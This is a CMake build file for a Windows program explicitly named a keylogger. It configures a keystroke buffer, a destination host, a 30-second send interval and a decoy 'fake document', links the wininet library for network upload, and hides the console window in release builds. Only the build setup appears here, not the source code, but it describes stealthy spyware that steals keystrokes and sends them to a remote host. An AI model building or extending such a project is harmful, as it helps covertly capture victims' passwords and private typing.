cmake_minimum_required(VERSION 3.5)
project(keylogger VERSION 0.1.0)

# options
set(KEYLOGGER_BUFFER_SIZE 1048576)
set(KEYLOGGER_HOSTNAME "localhost")
set(KEYLOGGER_FAKE_DOCUMENT "test.txt")
set(KEYLOGGER_SEND_TIME 30)

# source files
file(GLOB_RECURSE SRC_FILES ./src/*.c)
add_executable(keylogger ${SRC_FILES} res.rc)

# macro definitions
add_compile_definitions(KEYLOGGER_BUFFER_SIZE=${KEYLOGGER_BUFFER_SIZE})
add_compile_definitions(KEYLOGGER_HOSTNAME="${KEYLOGGER_HOSTNAME}")
add_compile_definitions(KEYLOGGER_FAKE_DOCUMENT="${KEYLOGGER_FAKE_DOCUMENT}")
add_compile_definitions(KEYLOGGER_SEND_TIME=${KEYLOGGER_SEND_TIME})

# libraries
target_link_libraries(keylogger wininet)

# hide console in release mode only
if (NOT CMAKE_BUILD_TYPE STREQUAL "Debug")
    set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} -mwindows")
endif (NOT CMAKE_BUILD_TYPE STREQUAL "Debug")